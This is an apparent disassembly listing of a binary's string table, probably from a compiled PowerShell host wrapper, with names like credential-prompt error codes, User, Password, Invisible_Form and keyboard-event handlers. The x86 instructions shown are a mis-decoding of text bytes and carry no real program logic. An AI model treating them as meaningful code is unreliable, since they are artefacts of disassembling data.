  406cf6:	43                   	inc    %ebx
  406cf7:	5f                   	pop    %edi
  406cf8:	43                   	inc    %ebx
  406cf9:	52                   	push   %edx
  406cfa:	45                   	inc    %ebp
  406cfb:	44                   	inc    %esp
  406cfc:	45                   	inc    %ebp
  406cfd:	4e                   	dec    %esi
  406cfe:	54                   	push   %esp
  406cff:	49                   	dec    %ecx
  406d00:	41                   	inc    %ecx
  406d01:	4c                   	dec    %esp
  406d02:	53                   	push   %ebx
  406d03:	00 55 53             	add    %dl,0x53(%ebp)
  406d06:	45                   	inc    %ebp
  406d07:	52                   	push   %edx
  406d08:	4e                   	dec    %esi
  406d09:	41                   	inc    %ecx
  406d0a:	4d                   	dec    %ebp
  406d0b:	45                   	inc    %ebp
  406d0c:	5f                   	pop    %edi
  406d0d:	54                   	push   %esp
  406d0e:	41                   	inc    %ecx
  406d0f:	52                   	push   %edx
  406d10:	47                   	inc    %edi
  406d11:	45                   	inc    %ebp
  406d12:	54                   	push   %esp
  406d13:	5f                   	pop    %edi
  406d14:	43                   	inc    %ebx
  406d15:	52                   	push   %edx
  406d16:	45                   	inc    %ebp
  406d17:	44                   	inc    %esp
  406d18:	45                   	inc    %ebp
  406d19:	4e                   	dec    %esi
  406d1a:	54                   	push   %esp
  406d1b:	49                   	dec    %ecx
  406d1c:	41                   	inc    %ecx
  406d1d:	4c                   	dec    %esp
  406d1e:	53                   	push   %ebx
  406d1f:	00 4b 45             	add    %cl,0x45(%ebx)
  406d22:	45                   	inc    %ebp
  406d23:	50                   	push   %eax
  406d24:	5f                   	pop    %edi
  406d25:	55                   	push   %ebp
  406d26:	53                   	push   %ebx
  406d27:	45                   	inc    %ebp
  406d28:	52                   	push   %edx
  406d29:	4e                   	dec    %esi
  406d2a:	41                   	inc    %ecx
  406d2b:	4d                   	dec    %ebp
  406d2c:	45                   	inc    %ebp
  406d2d:	00 4e 4f             	add    %cl,0x4f(%esi)
  406d30:	5f                   	pop    %edi
  406d31:	45                   	inc    %ebp
  406d32:	52                   	push   %edx
  406d33:	52                   	push   %edx
  406d34:	4f                   	dec    %edi
  406d35:	52                   	push   %edx
  406d36:	00 45 52             	add    %al,0x52(%ebp)
  406d39:	52                   	push   %edx
  406d3a:	4f                   	dec    %edi
  406d3b:	52                   	push   %edx
  406d3c:	5f                   	pop    %edi
  406d3d:	43                   	inc    %ebx
  406d3e:	41                   	inc    %ecx
  406d3f:	4e                   	dec    %esi
  406d40:	43                   	inc    %ebx
  406d41:	45                   	inc    %ebp
  406d42:	4c                   	dec    %esp
  406d43:	4c                   	dec    %esp
  406d44:	45                   	inc    %ebp
  406d45:	44                   	inc    %esp
  406d46:	00 45 52             	add    %al,0x52(%ebp)
  406d49:	52                   	push   %edx
  406d4a:	4f                   	dec    %edi
  406d4b:	52                   	push   %edx
  406d4c:	5f                   	pop    %edi
  406d4d:	4e                   	dec    %esi
  406d4e:	4f                   	dec    %edi
  406d4f:	5f                   	pop    %edi
  406d50:	53                   	push   %ebx
  406d51:	55                   	push   %ebp
  406d52:	43                   	inc    %ebx
  406d53:	48                   	dec    %eax
  406d54:	5f                   	pop    %edi
  406d55:	4c                   	dec    %esp
  406d56:	4f                   	dec    %edi
  406d57:	47                   	inc    %edi
  406d58:	4f                   	dec    %edi
  406d59:	4e                   	dec    %esi
  406d5a:	5f                   	pop    %edi
  406d5b:	53                   	push   %ebx
  406d5c:	45                   	inc    %ebp
  406d5d:	53                   	push   %ebx
  406d5e:	53                   	push   %ebx
  406d5f:	49                   	dec    %ecx
  406d60:	4f                   	dec    %edi
  406d61:	4e                   	dec    %esi
  406d62:	00 45 52             	add    %al,0x52(%ebp)
  406d65:	52                   	push   %edx
  406d66:	4f                   	dec    %edi
  406d67:	52                   	push   %edx
  406d68:	5f                   	pop    %edi
  406d69:	4e                   	dec    %esi
  406d6a:	4f                   	dec    %edi
  406d6b:	54                   	push   %esp
  406d6c:	5f                   	pop    %edi
  406d6d:	46                   	inc    %esi
  406d6e:	4f                   	dec    %edi
  406d6f:	55                   	push   %ebp
  406d70:	4e                   	dec    %esi
  406d71:	44                   	inc    %esp
  406d72:	00 45 52             	add    %al,0x52(%ebp)
  406d75:	52                   	push   %edx
  406d76:	4f                   	dec    %edi
  406d77:	52                   	push   %edx
  406d78:	5f                   	pop    %edi
  406d79:	49                   	dec    %ecx
  406d7a:	4e                   	dec    %esi
  406d7b:	56                   	push   %esi
  406d7c:	41                   	inc    %ecx
  406d7d:	4c                   	dec    %esp
  406d7e:	49                   	dec    %ecx
  406d7f:	44                   	inc    %esp
  406d80:	5f                   	pop    %edi
  406d81:	41                   	inc    %ecx
  406d82:	43                   	inc    %ebx
  406d83:	43                   	inc    %ebx
  406d84:	4f                   	dec    %edi
  406d85:	55                   	push   %ebp
  406d86:	4e                   	dec    %esi
  406d87:	54                   	push   %esp
  406d88:	5f                   	pop    %edi
  406d89:	4e                   	dec    %esi
  406d8a:	41                   	inc    %ecx
  406d8b:	4d                   	dec    %ebp
  406d8c:	45                   	inc    %ebp
  406d8d:	00 45 52             	add    %al,0x52(%ebp)
  406d90:	52                   	push   %edx
  406d91:	4f                   	dec    %edi
  406d92:	52                   	push   %edx
  406d93:	5f                   	pop    %edi
  406d94:	49                   	dec    %ecx
  406d95:	4e                   	dec    %esi
  406d96:	53                   	push   %ebx
  406d97:	55                   	push   %ebp
  406d98:	46                   	inc    %esi
  406d99:	46                   	inc    %esi
  406d9a:	49                   	dec    %ecx
  406d9b:	43                   	inc    %ebx
  406d9c:	49                   	dec    %ecx
  406d9d:	45                   	inc    %ebp
  406d9e:	4e                   	dec    %esi
  406d9f:	54                   	push   %esp
  406da0:	5f                   	pop    %edi
  406da1:	42                   	inc    %edx
  406da2:	55                   	push   %ebp
  406da3:	46                   	inc    %esi
  406da4:	46                   	inc    %esi
  406da5:	45                   	inc    %ebp
  406da6:	52                   	push   %edx
  406da7:	00 45 52             	add    %al,0x52(%ebp)
  406daa:	52                   	push   %edx
  406dab:	4f                   	dec    %edi
  406dac:	52                   	push   %edx
  406dad:	5f                   	pop    %edi
  406dae:	49                   	dec    %ecx
  406daf:	4e                   	dec    %esi
  406db0:	56                   	push   %esi
  406db1:	41                   	inc    %ecx
  406db2:	4c                   	dec    %esp
  406db3:	49                   	dec    %ecx
  406db4:	44                   	inc    %esp
  406db5:	5f                   	pop    %edi
  406db6:	50                   	push   %eax
  406db7:	41                   	inc    %ecx
  406db8:	52                   	push   %edx
  406db9:	41                   	inc    %ecx
  406dba:	4d                   	dec    %ebp
  406dbb:	45                   	inc    %ebp
  406dbc:	54                   	push   %esp
  406dbd:	45                   	inc    %ebp
  406dbe:	52                   	push   %edx
  406dbf:	00 45 52             	add    %al,0x52(%ebp)
  406dc2:	52                   	push   %edx
  406dc3:	4f                   	dec    %edi
  406dc4:	52                   	push   %edx
  406dc5:	5f                   	pop    %edi
  406dc6:	49                   	dec    %ecx
  406dc7:	4e                   	dec    %esi
  406dc8:	56                   	push   %esi
  406dc9:	41                   	inc    %ecx
  406dca:	4c                   	dec    %esp
  406dcb:	49                   	dec    %ecx
  406dcc:	44                   	inc    %esp
  406dcd:	5f                   	pop    %edi
  406dce:	46                   	inc    %esi
  406dcf:	4c                   	dec    %esp
  406dd0:	41                   	inc    %ecx
  406dd1:	47                   	inc    %edi
  406dd2:	53                   	push   %ebx
  406dd3:	00 55 73             	add    %dl,0x73(%ebp)
  406dd6:	65 72 00             	gs jb  0x406dd9
  406dd9:	50                   	push   %eax
  406dda:	61                   	popa
  406ddb:	73 73                	jae    0x406e50
  406ddd:	77 6f                	ja     0x406e4e
  406ddf:	72 64                	jb     0x406e45
  406de1:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  406de5:	61                   	popa
  406de6:	69 6e 00 43 6f 6e 73 	imul   $0x736e6f43,0x0(%esi),%ebp
  406ded:	6f                   	outsl  %ds:(%esi),(%dx)
  406dee:	6c                   	insb   (%dx),%es:(%edi)
  406def:	65 43                	gs inc %ebx
  406df1:	6f                   	outsl  %ds:(%esi),(%dx)
  406df2:	6c                   	insb   (%dx),%es:(%edi)
  406df3:	6f                   	outsl  %ds:(%esi),(%dx)
  406df4:	72 00                	jb     0x406df6
  406df6:	47                   	inc    %edi
  406df7:	55                   	push   %ebp
  406df8:	49                   	dec    %ecx
  406df9:	42                   	inc    %edx
  406dfa:	61                   	popa
  406dfb:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406dfe:	72 6f                	jb     0x406e6f
  406e00:	75 6e                	jne    0x406e70
  406e02:	64 43                	fs inc %ebx
  406e04:	6f                   	outsl  %ds:(%esi),(%dx)
  406e05:	6c                   	insb   (%dx),%es:(%edi)
  406e06:	6f                   	outsl  %ds:(%esi),(%dx)
  406e07:	72 00                	jb     0x406e09
  406e09:	47                   	inc    %edi
  406e0a:	55                   	push   %ebp
  406e0b:	49                   	dec    %ecx
  406e0c:	46                   	inc    %esi
  406e0d:	6f                   	outsl  %ds:(%esi),(%dx)
  406e0e:	72 65                	jb     0x406e75
  406e10:	67 72 6f             	addr16 jb 0x406e82
  406e13:	75 6e                	jne    0x406e83
  406e15:	64 43                	fs inc %ebx
  406e17:	6f                   	outsl  %ds:(%esi),(%dx)
  406e18:	6c                   	insb   (%dx),%es:(%edi)
  406e19:	6f                   	outsl  %ds:(%esi),(%dx)
  406e1a:	72 00                	jb     0x406e1c
  406e1c:	67 65 74 5f          	addr16 gs je 0x406e7f
  406e20:	42                   	inc    %edx
  406e21:	61                   	popa
  406e22:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406e25:	72 6f                	jb     0x406e96
  406e27:	75 6e                	jne    0x406e97
  406e29:	64 43                	fs inc %ebx
  406e2b:	6f                   	outsl  %ds:(%esi),(%dx)
  406e2c:	6c                   	insb   (%dx),%es:(%edi)
  406e2d:	6f                   	outsl  %ds:(%esi),(%dx)
  406e2e:	72 00                	jb     0x406e30
  406e30:	73 65                	jae    0x406e97
  406e32:	74 5f                	je     0x406e93
  406e34:	42                   	inc    %edx
  406e35:	61                   	popa
  406e36:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406e39:	72 6f                	jb     0x406eaa
  406e3b:	75 6e                	jne    0x406eab
  406e3d:	64 43                	fs inc %ebx
  406e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  406e40:	6c                   	insb   (%dx),%es:(%edi)
  406e41:	6f                   	outsl  %ds:(%esi),(%dx)
  406e42:	72 00                	jb     0x406e44
  406e44:	53                   	push   %ebx
  406e45:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406e4c:	5f                   	pop    %edi
  406e4d:	42                   	inc    %edx
  406e4e:	75 66                	jne    0x406eb6
  406e50:	66 65 72 53          	data16 gs jb 0x406ea7
  406e54:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406e5b:	5f                   	pop    %edi
  406e5c:	42                   	inc    %edx
  406e5d:	75 66                	jne    0x406ec5
  406e5f:	66 65 72 53          	data16 gs jb 0x406eb6
  406e63:	69 7a 65 00 43 6f 6f 	imul   $0x6f6f4300,0x65(%edx),%edi
  406e6a:	72 64                	jb     0x406ed0
  406e6c:	69 6e 61 74 65 73 00 	imul   $0x736574,0x61(%esi),%ebp
  406e73:	67 65 74 5f          	addr16 gs je 0x406ed6
  406e77:	43                   	inc    %ebx
  406e78:	75 72                	jne    0x406eec
  406e7a:	73 6f                	jae    0x406eeb
  406e7c:	72 50                	jb     0x406ece
  406e7e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e7f:	73 69                	jae    0x406eea
  406e81:	74 69                	je     0x406eec
  406e83:	6f                   	outsl  %ds:(%esi),(%dx)
  406e84:	6e                   	outsb  %ds:(%esi),(%dx)
  406e85:	00 73 65             	add    %dh,0x65(%ebx)
  406e88:	74 5f                	je     0x406ee9
  406e8a:	43                   	inc    %ebx
  406e8b:	75 72                	jne    0x406eff
  406e8d:	73 6f                	jae    0x406efe
  406e8f:	72 50                	jb     0x406ee1
  406e91:	6f                   	outsl  %ds:(%esi),(%dx)
  406e92:	73 69                	jae    0x406efd
  406e94:	74 69                	je     0x406eff
  406e96:	6f                   	outsl  %ds:(%esi),(%dx)
  406e97:	6e                   	outsb  %ds:(%esi),(%dx)
  406e98:	00 67 65             	add    %ah,0x65(%edi)
  406e9b:	74 5f                	je     0x406efc
  406e9d:	43                   	inc    %ebx
  406e9e:	75 72                	jne    0x406f12
  406ea0:	73 6f                	jae    0x406f11
  406ea2:	72 53                	jb     0x406ef7
  406ea4:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406eab:	5f                   	pop    %edi
  406eac:	43                   	inc    %ebx
  406ead:	75 72                	jne    0x406f21
  406eaf:	73 6f                	jae    0x406f20
  406eb1:	72 53                	jb     0x406f06
  406eb3:	69 7a 65 00 49 6e 76 	imul   $0x766e4900,0x65(%edx),%edi
  406eba:	69 73 69 62 6c 65 5f 	imul   $0x5f656c62,0x69(%ebx),%esi
  406ec1:	46                   	inc    %esi
  406ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec3:	72 6d                	jb     0x406f32
  406ec5:	00 46 6c             	add    %al,0x6c(%esi)
  406ec8:	75 73                	jne    0x406f3d
  406eca:	68 49 6e 70 75       	push   $0x75706e49
  406ecf:	74 42                	je     0x406f13
  406ed1:	75 66                	jne    0x406f39
  406ed3:	66 65 72 00          	data16 gs jb 0x406ed7
  406ed7:	67 65 74 5f          	addr16 gs je 0x406f3a
  406edb:	46                   	inc    %esi
  406edc:	6f                   	outsl  %ds:(%esi),(%dx)
  406edd:	72 65                	jb     0x406f44
  406edf:	67 72 6f             	addr16 jb 0x406f51
  406ee2:	75 6e                	jne    0x406f52
  406ee4:	64 43                	fs inc %ebx
  406ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee7:	6c                   	insb   (%dx),%es:(%edi)
  406ee8:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee9:	72 00                	jb     0x406eeb
  406eeb:	73 65                	jae    0x406f52
  406eed:	74 5f                	je     0x406f4e
  406eef:	46                   	inc    %esi
  406ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ef1:	72 65                	jb     0x406f58
  406ef3:	67 72 6f             	addr16 jb 0x406f65
  406ef6:	75 6e                	jne    0x406f66
  406ef8:	64 43                	fs inc %ebx
  406efa:	6f                   	outsl  %ds:(%esi),(%dx)
  406efb:	6c                   	insb   (%dx),%es:(%edi)
  406efc:	6f                   	outsl  %ds:(%esi),(%dx)
  406efd:	72 00                	jb     0x406eff
  406eff:	42                   	inc    %edx
  406f00:	75 66                	jne    0x406f68
  406f02:	66 65 72 43          	data16 gs jb 0x406f49
  406f06:	65 6c                	gs insb (%dx),%es:(%edi)
  406f08:	6c                   	insb   (%dx),%es:(%edi)
  406f09:	00 52 65             	add    %dl,0x65(%edx)
  406f0c:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  406f10:	67 6c                	insb   (%dx),%es:(%di)
  406f12:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  406f16:	74 42                	je     0x406f5a
  406f18:	75 66                	jne    0x406f80
  406f1a:	66 65 72 43          	data16 gs jb 0x406f61
  406f1e:	6f                   	outsl  %ds:(%esi),(%dx)
  406f1f:	6e                   	outsb  %ds:(%esi),(%dx)
  406f20:	74 65                	je     0x406f87
  406f22:	6e                   	outsb  %ds:(%esi),(%dx)
  406f23:	74 73                	je     0x406f98
  406f25:	00 67 65             	add    %ah,0x65(%edi)
  406f28:	74 5f                	je     0x406f89
  406f2a:	4b                   	dec    %ebx
  406f2b:	65 79 41             	gs jns 0x406f6f
  406f2e:	76 61                	jbe    0x406f91
  406f30:	69 6c 61 62 6c 65 00 	imul   $0x6700656c,0x62(%ecx,%eiz,2),%ebp
  406f37:	67 
  406f38:	65 74 5f             	gs je  0x406f9a
  406f3b:	4d                   	dec    %ebp
  406f3c:	61                   	popa
  406f3d:	78 50                	js     0x406f8f
  406f3f:	68 79 73 69 63       	push   $0x63697379
  406f44:	61                   	popa
  406f45:	6c                   	insb   (%dx),%es:(%edi)
  406f46:	57                   	push   %edi
  406f47:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406f4e:	7a 65                	jp     0x406fb5
  406f50:	00 67 65             	add    %ah,0x65(%edi)
  406f53:	74 5f                	je     0x406fb4
  406f55:	4d                   	dec    %ebp
  406f56:	61                   	popa
  406f57:	78 57                	js     0x406fb0
  406f59:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406f60:	7a 65                	jp     0x406fc7
  406f62:	00 4b 65             	add    %cl,0x65(%ebx)
  406f65:	79 49                	jns    0x406fb0
  406f67:	6e                   	outsb  %ds:(%esi),(%dx)
  406f68:	66 6f                	outsw  %ds:(%esi),(%dx)
  406f6a:	00 52 65             	add    %dl,0x65(%edx)
  406f6d:	61                   	popa
  406f6e:	64 4b                	fs dec %ebx
  406f70:	65 79 4f             	gs jns 0x406fc2
  406f73:	70 74                	jo     0x406fe9
  406f75:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  406f7c:	61                   	popa
  406f7d:	64 4b                	fs dec %ebx
  406f7f:	65 79 00             	gs jns 0x406f82
  406f82:	53                   	push   %ebx
  406f83:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406f86:	6c                   	insb   (%dx),%es:(%edi)
  406f87:	6c                   	insb   (%dx),%es:(%edi)
  406f88:	42                   	inc    %edx
  406f89:	75 66                	jne    0x406ff1
  406f8b:	66 65 72 43          	data16 gs jb 0x406fd2
  406f8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f90:	6e                   	outsb  %ds:(%esi),(%dx)
  406f91:	74 65                	je     0x406ff8
  406f93:	6e                   	outsb  %ds:(%esi),(%dx)
  406f94:	74 73                	je     0x407009
  406f96:	00 53 65             	add    %dl,0x65(%ebx)
  406f99:	74 42                	je     0x406fdd
  406f9b:	75 66                	jne    0x407003
  406f9d:	66 65 72 43          	data16 gs jb 0x406fe4
  406fa1:	6f                   	outsl  %ds:(%esi),(%dx)
  406fa2:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa3:	74 65                	je     0x40700a
  406fa5:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa6:	74 73                	je     0x40701b
  406fa8:	00 67 65             	add    %ah,0x65(%edi)
  406fab:	74 5f                	je     0x40700c
  406fad:	57                   	push   %edi
  406fae:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  406fb5:	73 69                	jae    0x407020
  406fb7:	74 69                	je     0x407022
  406fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  406fba:	6e                   	outsb  %ds:(%esi),(%dx)
  406fbb:	00 73 65             	add    %dh,0x65(%ebx)
  406fbe:	74 5f                	je     0x40701f
  406fc0:	57                   	push   %edi
  406fc1:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  406fc8:	73 69                	jae    0x407033
  406fca:	74 69                	je     0x407035
  406fcc:	6f                   	outsl  %ds:(%esi),(%dx)
  406fcd:	6e                   	outsb  %ds:(%esi),(%dx)
  406fce:	00 67 65             	add    %ah,0x65(%edi)
  406fd1:	74 5f                	je     0x407032
  406fd3:	57                   	push   %edi
  406fd4:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406fdb:	7a 65                	jp     0x407042
  406fdd:	00 73 65             	add    %dh,0x65(%ebx)
  406fe0:	74 5f                	je     0x407041
  406fe2:	57                   	push   %edi
  406fe3:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406fea:	7a 65                	jp     0x407051
  406fec:	00 67 65             	add    %ah,0x65(%edi)
  406fef:	74 5f                	je     0x407050
  406ff1:	57                   	push   %edi
  406ff2:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  406ff9:	74 6c                	je     0x407067
  406ffb:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406fff:	74 5f                	je     0x407060
  407001:	57                   	push   %edi
  407002:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407009:	74 6c                	je     0x407077
  40700b:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  40700f:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407012:	72 6f                	jb     0x407083
  407014:	75 6e                	jne    0x407084
  407016:	64 43                	fs inc %ebx
  407018:	6f                   	outsl  %ds:(%esi),(%dx)
  407019:	6c                   	insb   (%dx),%es:(%edi)
  40701a:	6f                   	outsl  %ds:(%esi),(%dx)
  40701b:	72 00                	jb     0x40701d
  40701d:	42                   	inc    %edx
  40701e:	75 66                	jne    0x407086
  407020:	66 65 72 53          	data16 gs jb 0x407077
  407024:	69 7a 65 00 43 75 72 	imul   $0x72754300,0x65(%edx),%edi
  40702b:	73 6f                	jae    0x40709c
  40702d:	72 50                	jb     0x40707f
  40702f:	6f                   	outsl  %ds:(%esi),(%dx)
  407030:	73 69                	jae    0x40709b
  407032:	74 69                	je     0x40709d
  407034:	6f                   	outsl  %ds:(%esi),(%dx)
  407035:	6e                   	outsb  %ds:(%esi),(%dx)
  407036:	00 43 75             	add    %al,0x75(%ebx)
  407039:	72 73                	jb     0x4070ae
  40703b:	6f                   	outsl  %ds:(%esi),(%dx)
  40703c:	72 53                	jb     0x407091
  40703e:	69 7a 65 00 46 6f 72 	imul   $0x726f4600,0x65(%edx),%edi
  407045:	65 67 72 6f          	gs addr16 jb 0x4070b8
  407049:	75 6e                	jne    0x4070b9
  40704b:	64 43                	fs inc %ebx
  40704d:	6f                   	outsl  %ds:(%esi),(%dx)
  40704e:	6c                   	insb   (%dx),%es:(%edi)
  40704f:	6f                   	outsl  %ds:(%esi),(%dx)
  407050:	72 00                	jb     0x407052
  407052:	4b                   	dec    %ebx
  407053:	65 79 41             	gs jns 0x407097
  407056:	76 61                	jbe    0x4070b9
  407058:	69 6c 61 62 6c 65 00 	imul   $0x4d00656c,0x62(%ecx,%eiz,2),%ebp
  40705f:	4d 
  407060:	61                   	popa
  407061:	78 50                	js     0x4070b3
  407063:	68 79 73 69 63       	push   $0x63697379
  407068:	61                   	popa
  407069:	6c                   	insb   (%dx),%es:(%edi)
  40706a:	57                   	push   %edi
  40706b:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407072:	7a 65                	jp     0x4070d9
  407074:	00 4d 61             	add    %cl,0x61(%ebp)
  407077:	78 57                	js     0x4070d0
  407079:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407080:	7a 65                	jp     0x4070e7
  407082:	00 57 69             	add    %dl,0x69(%edi)
  407085:	6e                   	outsb  %ds:(%esi),(%dx)
  407086:	64 6f                	outsl  %fs:(%esi),(%dx)
  407088:	77 50                	ja     0x4070da
  40708a:	6f                   	outsl  %ds:(%esi),(%dx)
  40708b:	73 69                	jae    0x4070f6
  40708d:	74 69                	je     0x4070f8
  40708f:	6f                   	outsl  %ds:(%esi),(%dx)
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 57 69             	add    %dl,0x69(%edi)
  407094:	6e                   	outsb  %ds:(%esi),(%dx)
  407095:	64 6f                	outsl  %fs:(%esi),(%dx)
  407097:	77 53                	ja     0x4070ec
  407099:	69 7a 65 00 57 69 6e 	imul   $0x6e695700,0x65(%edx),%edi
  4070a0:	64 6f                	outsl  %fs:(%esi),(%dx)
  4070a2:	77 54                	ja     0x4070f8
  4070a4:	69 74 6c 65 00 4d 42 	imul   $0x5f424d00,0x65(%esp,%ebp,2),%esi
  4070ab:	5f 
  4070ac:	47                   	inc    %edi
  4070ad:	65 74 53             	gs je  0x407103
  4070b0:	74 72                	je     0x407124
  4070b2:	69 6e 67 00 44 69 61 	imul   $0x61694400,0x67(%esi),%ebp
  4070b9:	6c                   	insb   (%dx),%es:(%edi)
  4070ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4070bb:	67 52                	addr16 push %edx
  4070bd:	65 73 75             	gs jae 0x407135
  4070c0:	6c                   	insb   (%dx),%es:(%edi)
  4070c1:	74 00                	je     0x4070c3
  4070c3:	53                   	push   %ebx
  4070c4:	68 6f 77 00 53       	push   $0x5300776f
  4070c9:	79 73                	jns    0x40713e
  4070cb:	74 65                	je     0x407132
  4070cd:	6d                   	insl   (%dx),%es:(%edi)
  4070ce:	2e 43                	cs inc %ebx
  4070d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4070d1:	6c                   	insb   (%dx),%es:(%edi)
  4070d2:	6c                   	insb   (%dx),%es:(%edi)
  4070d3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4070d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4070d9:	73 2e                	jae    0x407109
  4070db:	4f                   	dec    %edi
  4070dc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4070df:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  4070e3:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4070e6:	00 43 6f             	add    %al,0x6f(%ebx)
  4070e9:	6c                   	insb   (%dx),%es:(%edi)
  4070ea:	6c                   	insb   (%dx),%es:(%edi)
  4070eb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4070f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4070f1:	60                   	pusha
  4070f2:	31 00                	xor    %eax,(%eax)
  4070f4:	43                   	inc    %ebx
  4070f5:	68 6f 69 63 65       	push   $0x6563696f
  4070fa:	44                   	inc    %esp
  4070fb:	65 73 63             	gs jae 0x407161
  4070fe:	72 69                	jb     0x407169
  407100:	70 74                	jo     0x407176
  407102:	69 6f 6e 00 54 6f 55 	imul   $0x556f5400,0x6e(%edi),%ebp
  407109:	6e                   	outsb  %ds:(%esi),(%dx)
  40710a:	69 63 6f 64 65 00 4b 	imul   $0x4b006564,0x6f(%ebx),%esp
  407111:	65 79 73             	gs jns 0x407187
  407114:	00 47 65             	add    %al,0x65(%edi)
  407117:	74 43                	je     0x40715c
  407119:	68 61 72 46 72       	push   $0x72467261
  40711e:	6f                   	outsl  %ds:(%esi),(%dx)
  40711f:	6d                   	insl   (%dx),%es:(%edi)
  407120:	4b                   	dec    %ebx
  407121:	65 79 73             	gs jns 0x407197
  407124:	00 63 68             	add    %ah,0x68(%ebx)
  407127:	65 63 6b 4b          	arpl   %ebp,%gs:0x4b(%ebx)
  40712b:	65 79 44             	gs jns 0x407172
  40712e:	6f                   	outsl  %ds:(%esi),(%dx)
  40712f:	77 6e                	ja     0x40719f
  407131:	00 6b 65             	add    %ch,0x65(%ebx)
  407134:	79 69                	jns    0x40719f
  407136:	6e                   	outsb  %ds:(%esi),(%dx)
  407137:	66 6f                	outsw  %ds:(%esi),(%dx)
  407139:	00 4b 65             	add    %cl,0x65(%ebx)
  40713c:	79 45                	jns    0x407183
  40713e:	76 65                	jbe    0x4071a5
  407140:	6e                   	outsb  %ds:(%esi),(%dx)
  407141:	74 41                	je     0x407184
  407143:	72 67                	jb     0x4071ac
  407145:	73 00                	jae    0x407147
  407147:	4b                   	dec    %ebx
  407148:	65 79 62             	gs jns 0x4071ad
  40714b:	6f                   	outsl  %ds:(%esi),(%dx)
  40714c:	61                   	popa
  40714d:	72 64                	jb     0x4071b3
  40714f:	5f                   	pop    %edi
  407150:	46                   	inc    %esi
  407151:	6f                   	outsl  %ds:(%esi),(%dx)
  407152:	72 6d                	jb     0x4071c1
  407154:	5f                   	pop    %edi
  407155:	4b                   	dec    %ebx
  407156:	65 79 44             	gs jns 0x40719d
  407159:	6f                   	outsl  %ds:(%esi),(%dx)
  40715a:	77 6e                	ja     0x4071ca
  40715c:	00 4b 65             	add    %cl,0x65(%ebx)
  40715f:	79 62                	jns    0x4071c3
  407161:	6f                   	outsl  %ds:(%esi),(%dx)
  407162:	61                   	popa
  407163:	72 64                	jb     0x4071c9
  407165:	5f                   	pop    %edi
  407166:	46                   	inc    %esi
  407167:	6f                   	outsl  %ds:(%esi),(%dx)
  407168:	72 6d                	jb     0x4071d7
  40716a:	5f                   	pop    %edi
  40716b:	4b                   	dec    %ebx
  40716c:	65 79 55             	gs jns 0x4071c4
  40716f:	70 00                	jo     0x407171
  407171:	50                   	push   %eax
  407172:	72 6f                	jb     0x4071e3
  407174:	67 72 65             	addr16 jb 0x4071dc
  407177:	73 73                	jae    0x4071ec
  407179:	42                   	inc    %edx
  40717a:	61                   	popa
  40717b:	72 43                	jb     0x4071c0
  40717d:	6f                   	outsl  %ds:(%esi),(%dx)
  40717e:	6c                   	insb   (%dx),%es:(%edi)
  40717f:	6f                   	outsl  %ds:(%esi),(%dx)
  407180:	72 00                	jb     0x407182
  407182:	53                   	push   %ebx
  407183:	79 73                	jns    0x4071f8
  407185:	74 65                	je     0x4071ec
  407187:	6d                   	insl   (%dx),%es:(%edi)
  407188:	2e 54                	cs push %esp
  40718a:	69 6d 65 72 73 00 54 	imul   $0x54007372,0x65(%ebp),%ebp
  407191:	69 6d 65 72 00 74 69 	imul   $0x69740072,0x65(%ebp),%ebp
  407198:	6d                   	insl   (%dx),%es:(%edi)
  407199:	65 72 00             	gs jb  0x40719c
  40719c:	62 61 72             	bound  %esp,0x72(%ecx)
  40719f:	4e                   	dec    %esi
  4071a0:	75 6d                	jne    0x40720f
  4071a2:	62 65 72             	bound  %esp,0x72(%ebp)
  4071a5:	00 62 61             	add    %ah,0x61(%edx)
  4071a8:	72 56                	jb     0x407200
  4071aa:	61                   	popa
  4071ab:	6c                   	insb   (%dx),%es:(%edi)
